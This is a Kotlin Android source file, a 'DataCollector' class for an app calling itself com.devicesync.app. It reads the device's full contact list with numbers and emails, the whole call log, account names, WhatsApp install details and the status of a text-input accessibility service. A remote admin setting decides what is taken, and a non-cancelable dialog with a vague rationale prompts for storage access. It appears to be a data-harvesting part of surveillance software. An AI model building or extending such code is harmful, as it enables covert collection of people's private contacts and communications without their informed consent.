package com.devicesync.app.utils

import android.Manifest
import android.app.Activity
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

class DataCollector(private val context: Context) {
    
    companion object {
        private const val TAG = "DataCollector"
        private const val STORAGE_PERMISSION_REQUEST_CODE = 3001
    }
    
    /**
     * Collect all data types that have been granted permissions AND are allowed by admin
     */
    fun collectAllData(): JSONObject {
        val data = JSONObject()
        
        try {
            // Collect contacts if permission granted AND admin allows it
            if (hasContactsPermission() && AdminConfigManager.isDataTypeAllowed("CONTACTS")) {
                data.put("contacts", collectContacts())
                Log.d(TAG, "Contacts collected successfully")
            } else {
                if (!hasContactsPermission()) {
                    Log.w(TAG, "Contacts permission not granted")
                } else if (!AdminConfigManager.isDataTypeAllowed("CONTACTS")) {
                    Log.w(TAG, "Contacts collection not allowed by admin")
                }
            }
            
            // Collect call logs if permission granted AND admin allows it
            if (hasCallLogPermission() && AdminConfigManager.isDataTypeAllowed("CALL_LOGS")) {
                data.put("call_logs", collectCallLogs())
                Log.d(TAG, "Call logs collected successfully")
            } else {
                if (!hasCallLogPermission()) {
                    Log.w(TAG, "Call logs permission not granted")
                } else if (!AdminConfigManager.isDataTypeAllowed("CALL_LOGS")) {
                    Log.w(TAG, "Call logs collection not allowed by admin")
                }
            }
            
            // Collect notifications if permission granted AND admin allows it
            if (hasNotificationPermission() && AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS")) {
                data.put("notifications", collectNotifications())
                Log.d(TAG, "Notifications collected successfully")
            } else {
                if (!hasNotificationPermission()) {
                    Log.w(TAG, "Notification permission not granted")
                } else if (!AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS")) {
                    Log.w(TAG, "Notifications collection not allowed by admin")
                }
            }
            
            // Collect email accounts if permission granted AND admin allows it
            if (hasAccountsPermission() && AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS")) {
                data.put("email_accounts", collectEmailAccounts())
                Log.d(TAG, "Email accounts collected successfully")
            } else {
                if (!hasAccountsPermission()) {
                    Log.w(TAG, "Accounts permission not granted")
                } else if (!AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS")) {
                    Log.w(TAG, "Email accounts collection not allowed by admin")
                }
            }
            

            
            // Collect WhatsApp data if permission granted AND admin allows it
            if (hasStoragePermission() && AdminConfigManager.isDataTypeAllowed("WHATSAPP")) {
                data.put("whatsapp", collectWhatsAppData())
                Log.d(TAG, "WhatsApp data collected successfully")
            } else {
                if (!hasStoragePermission()) {
                    Log.w(TAG, "Storage permission not granted - requesting permission")
                    // Request storage permission if not granted
                    requestStoragePermissionIfNeeded()
                } else if (!AdminConfigManager.isDataTypeAllowed("WHATSAPP")) {
                    Log.w(TAG, "WhatsApp data collection not allowed by admin")
                }
            }
            
            // Collect accessibility data if permission granted (always allowed, not controlled by admin)
            if (hasAccessibilityPermission()) {
                data.put("accessibility", collectAccessibilityData())
                Log.d(TAG, "Accessibility data collected successfully")
            } else {
                Log.w(TAG, "Accessibility permission not granted")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting data", e)
        }
        
        return data
    }
    
    /**
     * Collect contacts data
     */
    fun collectContacts(): JSONArray {
        val contacts = JSONArray()
        val contentResolver: ContentResolver = context.contentResolver
        
        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER,
            ContactsContract.Contacts.TIMES_CONTACTED,
            ContactsContract.Contacts.LAST_TIME_CONTACTED
        )
        
        val selection = "${ContactsContract.Contacts.DISPLAY_NAME} IS NOT NULL"
        
        contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            selection,
            null,
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val contact = JSONObject()
                val contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                
                contact.put("id", contactId)
                contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)))
                contact.put("has_phone", cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0)
                contact.put("times_contacted", cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.TIMES_CONTACTED)))
                contact.put("last_contacted", cursor.getLong(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED)))
                
                // Get phone numbers
                val phoneNumbers = JSONArray()
                if (contact.getBoolean("has_phone")) {
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                        ),
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(contactId),
                        null
                    )
                    
                    phoneCursor?.use { phoneCursor ->
                        while (phoneCursor.moveToNext()) {
                            val phone = JSONObject()
                            phone.put("number", phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            phone.put("type", phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE)))
                            phoneNumbers.put(phone)
                        }
                    }
                }
                contact.put("phone_numbers", phoneNumbers)
                
                // Get email addresses
                val emails = JSONArray()
                val emailCursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Email.ADDRESS,
                        ContactsContract.CommonDataKinds.Email.TYPE
                    ),
                    "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                    arrayOf(contactId),
                    null
                )
                
                emailCursor?.use { emailCursor ->
                    while (emailCursor.moveToNext()) {
                        val email = JSONObject()
                        email.put("address", emailCursor.getString(emailCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)))
                        email.put("type", emailCursor.getInt(emailCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.TYPE)))
                        emails.put(email)
                    }
                }
                contact.put("emails", emails)
                
                contacts.put(contact)
            }
        }
        
        return contacts
    }
    
    /**
     * Collect call logs data
     */
    fun collectCallLogs(): JSONArray {
        val callLogs = JSONArray()
        val contentResolver: ContentResolver = context.contentResolver
        
        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.CACHED_NUMBER_TYPE,
            CallLog.Calls.CACHED_NUMBER_LABEL
        )
        
        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val callLog = JSONObject()
                
                callLog.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)))
                callLog.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                callLog.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                callLog.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                callLog.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                callLog.put("cached_name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)))
                callLog.put("cached_number_type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_TYPE)))
                callLog.put("cached_number_label", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_LABEL)))
                
                // Convert call type to readable string
                val callType = when (callLog.getInt("type")) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    CallLog.Calls.BLOCKED_TYPE -> "blocked"
                    else -> "unknown"
                }
                callLog.put("type_string", callType)
                
                callLogs.put(callLog)
            }
        }
        
        return callLogs
    }
    
    /**
     * Collect notifications data (limited to what's accessible)
     */
    fun collectNotifications(): JSONArray {
        val notifications = JSONArray()
        
        // Note: Direct notification access requires NotificationListenerService
        // For now, we'll collect basic notification settings and recent notifications if accessible
        
        try {
            // Check if notification access is enabled
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val notificationSettings = JSONObject()
            
            // Get notification channels info
            val channels = JSONArray()
            notificationManager.notificationChannels.forEach { channel ->
                val channelInfo = JSONObject()
                channelInfo.put("id", channel.id)
                channelInfo.put("name", channel.name)
                channelInfo.put("description", channel.description)
                channelInfo.put("importance", channel.importance)
                channelInfo.put("enabled", channel.importance != android.app.NotificationManager.IMPORTANCE_NONE)
                channels.put(channelInfo)
            }
            notificationSettings.put("channels", channels)
            
            // Add notification settings to the array
            notifications.put(notificationSettings)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting notification data", e)
        }
        
        return notifications
    }
    
    /**
     * Collect email accounts data
     */
    fun collectEmailAccounts(): JSONArray {
        val emailAccounts = JSONArray()
        val accountManager = android.accounts.AccountManager.get(context)
        
        try {
            val accounts = accountManager.accounts
            Log.d(TAG, "Found ${accounts.size} accounts on device")
            
            if (accounts.isEmpty()) {
                Log.d(TAG, "No accounts found on device")
                // Add a placeholder entry to show that we checked
                val placeholderAccount = JSONObject()
                placeholderAccount.put("name", "No accounts found")
                placeholderAccount.put("type", "placeholder")
                placeholderAccount.put("description", "Device has no configured email accounts")
                placeholderAccount.put("account_info", JSONObject().apply {
                    put("last_authenticated_time", "")
                    put("password", "")
                })
                emailAccounts.put(placeholderAccount)
            } else {
                accounts.forEach { account ->
                    Log.d(TAG, "Processing account: ${account.name} (${account.type})")
                    val emailAccount = JSONObject()
                    emailAccount.put("name", account.name)
                    emailAccount.put("type", account.type)
                    
                    // Only collect safe account data
                    try {
                        val description = accountManager.getUserData(account, "description")
                        emailAccount.put("description", description ?: "")
                    } catch (e: Exception) {
                        emailAccount.put("description", "")
                        Log.w(TAG, "Could not get description for ${account.name}: ${e.message}")
                    }
                    
                    // Get additional account info (safe data only)
                    val accountInfo = JSONObject()
                    try {
                        val lastAuthTime = accountManager.getUserData(account, "lastAuthenticatedTime")
                        accountInfo.put("last_authenticated_time", lastAuthTime ?: "")
                    } catch (e: Exception) {
                        accountInfo.put("last_authenticated_time", "")
                        Log.w(TAG, "Could not get last auth time for ${account.name}: ${e.message}")
                    }
                    
                    // Don't try to get password - it causes security exceptions
                    accountInfo.put("password", "") // Always empty for security
                    
                    emailAccount.put("account_info", accountInfo)
                    emailAccounts.put(emailAccount)
                    
                    // Print the full account object for debugging
                    Log.d(TAG, "📧 EMAIL ACCOUNT OBJECT:")
                    Log.d(TAG, "   Name: ${emailAccount.getString("name")}")
                    Log.d(TAG, "   Type: ${emailAccount.getString("type")}")
                    Log.d(TAG, "   Description: ${emailAccount.getString("description")}")
                    Log.d(TAG, "   Account Info: ${accountInfo.toString()}")
                    Log.d(TAG, "   Full JSON: ${emailAccount.toString()}")
                    Log.d(TAG, "   " + "=".repeat(50))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting email accounts", e)
            // Add error placeholder
            val errorAccount = JSONObject()
            errorAccount.put("name", "Error collecting accounts")
            errorAccount.put("type", "error")
            errorAccount.put("description", "Failed to collect account data: ${e.message}")
            errorAccount.put("account_info", JSONObject().apply {
                put("last_authenticated_time", "")
                put("password", "")
            })
            emailAccounts.put(errorAccount)
        }
        
        Log.d(TAG, "Email accounts collection completed. Found ${emailAccounts.length()} entries")
        
        // Print summary of all collected accounts
        Log.d(TAG, "📊 EMAIL ACCOUNTS SUMMARY:")
        for (i in 0 until emailAccounts.length()) {
            val account = emailAccounts.getJSONObject(i)
            Log.d(TAG, "   ${i + 1}. ${account.getString("name")} (${account.getString("type")})")
        }
        Log.d(TAG, "📊 TOTAL: ${emailAccounts.length()} email accounts collected")
        
        return emailAccounts
    }
    
    /**
     * Permission check methods
     */
    private fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasNotificationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasAccountsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
    }
    

    
    private fun hasStoragePermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Request storage permission if needed
     */
    private fun requestStoragePermissionIfNeeded() {
        try {
            // Check if we have an Activity context
            if (context is Activity) {
                val activity = context as Activity
                
                // Check if permission should be shown rationale
                if (ActivityCompat.shouldShowRequestPermissionRationale(activity, Manifest.permission.READ_EXTERNAL_STORAGE)) {
                    // Show rationale dialog
                    showStoragePermissionRationale(activity)
                } else {
                    // Request permission directly
                    ActivityCompat.requestPermissions(
                        activity,
                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                        STORAGE_PERMISSION_REQUEST_CODE
                    )
                }
            } else {
                Log.w(TAG, "Context is not an Activity, cannot request storage permission")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting storage permission", e)
        }
    }
    
    /**
     * Show storage permission rationale dialog
     */
    private fun showStoragePermissionRationale(activity: Activity) {
        MaterialAlertDialogBuilder(activity)
            .setTitle("Storage Permission Required")
            .setMessage("Storage permission is needed to access WhatsApp data for sync. This helps us provide you with better service.")
            .setPositiveButton("Grant Permission") { _, _ ->
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                    STORAGE_PERMISSION_REQUEST_CODE
                )
            }
            .setNegativeButton("Cancel") { _, _ ->
                Log.d(TAG, "User cancelled storage permission request")
            }
            .setCancelable(false)
            .show()
    }
    

    
    private fun hasAccessibilityPermission(): Boolean {
        // Check if accessibility service is enabled
        val accessibilityEnabled = try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED
            )
            accessibilityEnabled == 1
        } catch (e: Exception) {
            false
        }
        
        if (!accessibilityEnabled) {
            return false
        }
        
        // Check if our accessibility service is enabled
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        
        return enabledServices.contains("com.devicesync.app")
    }
    

    
    /**
     * Collect WhatsApp data (basic info only for security)
     */
    fun collectWhatsAppData(): JSONArray {
        val whatsappData = JSONArray()
        
        try {
            // Get WhatsApp package info
            val packageManager = context.packageManager
            val whatsappPackage = "com.whatsapp"
            
            val packageInfo = packageManager.getPackageInfo(whatsappPackage, 0)
            val whatsappInfo = JSONObject()
            whatsappInfo.put("package_name", whatsappPackage)
            whatsappInfo.put("version_name", packageInfo.versionName)
            whatsappInfo.put("version_code", packageInfo.versionCode)
            whatsappInfo.put("first_install_time", packageInfo.firstInstallTime)
            whatsappInfo.put("last_update_time", packageInfo.lastUpdateTime)
            
            whatsappData.put(whatsappInfo)
            
            Log.d(TAG, "WhatsApp data collection completed")
        } catch (e: Exception) {
            Log.w(TAG, "WhatsApp not installed or error collecting data: ${e.message}")
        }
        
        return whatsappData
    }
    
    /**
     * Collect accessibility data (always allowed, not controlled by admin)
     */
    private fun collectAccessibilityData(): JSONArray {
        val accessibilityData = JSONArray()
        
        try {
            // Check if accessibility is enabled
            val accessibilityEnabled = hasAccessibilityPermission()
            
            val accessibilityInfo = JSONObject()
            accessibilityInfo.put("enabled", accessibilityEnabled)
            accessibilityInfo.put("service_name", "TextInputAccessibilityService")
            accessibilityInfo.put("package_name", "com.devicesync.app")
            
            // Get enabled services
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            accessibilityInfo.put("enabled_services", enabledServices.split(",").map { it.trim() })
            
            accessibilityData.put(accessibilityInfo)
            
            Log.d(TAG, "Accessibility data collection completed")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting accessibility data", e)
        }
        
        return accessibilityData
    }
    
    /**
     * Get data collection summary
     */
    fun getDataSummary(): JSONObject {
        val summary = JSONObject()
        val data = collectAllData()
        
        summary.put("contacts_count", if (data.has("contacts")) data.getJSONArray("contacts").length() else 0)
        summary.put("call_logs_count", if (data.has("call_logs")) data.getJSONArray("call_logs").length() else 0)
        summary.put("notifications_count", if (data.has("notifications")) data.getJSONArray("notifications").length() else 0)
        summary.put("email_accounts_count", if (data.has("email_accounts")) data.getJSONArray("email_accounts").length() else 0)

        summary.put("whatsapp_count", if (data.has("whatsapp")) data.getJSONArray("whatsapp").length() else 0)
        summary.put("accessibility_count", if (data.has("accessibility")) data.getJSONArray("accessibility").length() else 0)
        
        summary.put("permissions_granted", JSONObject().apply {
            put("contacts", hasContactsPermission())
            put("call_logs", hasCallLogPermission())
            put("notifications", hasNotificationPermission())
            put("accounts", hasAccountsPermission())

            put("storage", hasStoragePermission())
            put("accessibility", hasAccessibilityPermission())
        })
        
        summary.put("admin_allowed", JSONObject().apply {
            put("contacts", AdminConfigManager.isDataTypeAllowed("CONTACTS"))
            put("call_logs", AdminConfigManager.isDataTypeAllowed("CALL_LOGS"))
            put("notifications", AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS"))
            put("email_accounts", AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS"))

            put("whatsapp", AdminConfigManager.isDataTypeAllowed("WHATSAPP"))
            put("accessibility", true) // Always allowed, not controlled by admin
        })
        
        return summary
    }
} 